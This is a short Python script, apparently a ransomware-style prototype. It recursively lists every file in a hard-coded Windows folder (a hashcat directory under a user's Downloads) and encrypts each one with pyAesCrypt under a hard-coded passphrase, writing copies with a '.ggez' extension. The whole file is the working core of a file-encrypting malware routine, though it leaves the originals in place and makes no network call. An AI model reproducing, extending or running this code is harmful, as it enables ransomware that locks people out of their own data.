from os import chdir, listdir
from subprocess import check_output
import pyAesCrypt as gg

buffersize = 64 * 4096
passPhrase = ''')FVHn@Mp'h7ooBlmeY[P^-`UKiQwGEQ%;;jI=ZhF3bY}m(f}65Gl;"WXz*x4wMQYw.^A&bg7K?n(yq5hO];-wUnwS.h-:]y)Jw'''

## List contents of the directory
workingDir = chdir("C:\\Users\\Player 1\\Downloads\\hashcat-master")
originalContents = listdir(workingDir)
#print(len(originalContents))

## Filtering for files only
dirFiles = check_output('dir /S /B /A:-D', shell=True, text=True)
#print(dirFiles)

## And the dirFiles in a list and append extension
inList = dirFiles.splitlines()
nameBefore = inList
nameAfter = [nameBefore + ".ggez" for nameBefore in nameBefore]
#print(nameBefore)
#print(nameAfter)

## Encrypt all
for oldextension, newextension in zip(nameBefore, nameAfter):
	gg.encryptFile("{}".format(oldextension), "{}".format(newextension), passPhrase, buffersize)

#EOF
